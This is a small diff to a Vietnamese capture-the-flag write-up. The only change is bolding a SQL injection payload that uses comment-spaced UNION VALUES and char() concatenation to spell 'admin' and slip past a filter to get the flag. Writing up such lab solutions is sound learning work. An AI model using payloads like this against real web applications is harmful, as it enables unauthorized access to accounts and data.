@@ -102,7 +102,7 @@ Tiếp tục tìm hiểu select-core link:(https://www.sqlite.org/syntax/select-
 
 ![image](https://github.com/user-attachments/assets/040419c0-6375-40df-8873-d91f6a1734ee) ![image](https://github.com/user-attachments/assets/d78305af-4cba-4fcf-ae09-e79a1d8130bb)
 
-Kết hợp tất cả các dữ kiện mình có được payload sau : uid=123&upw=123&level=1/\*\*/union/\*\*/Values(char(97)||char(100)||char(109)||char(105)||char(110)) và send thì ta sẽ có flag
+Kết hợp tất cả các dữ kiện mình có được payload sau : **uid=123&upw=123&level=1/\*\*/union/\*\*/Values(char(97)||char(100)||char(109)||char(105)||char(110))** và send thì ta sẽ có flag
 ![image](https://github.com/user-attachments/assets/18508ff9-f725-4440-87f0-6980a12778d4)
 
 
